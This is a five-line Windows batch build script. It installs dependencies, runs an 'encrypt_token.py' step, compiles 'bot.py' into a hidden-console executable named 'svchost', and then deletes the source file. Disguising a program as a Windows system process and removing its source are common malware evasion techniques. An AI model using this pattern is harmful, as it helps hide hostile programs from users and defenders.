@echo off
pip install -r requirements.txt
python encrypt_token.py
pyinstaller --onefile --noconsole --name svchost bot.py
if exist bot.py del bot.py
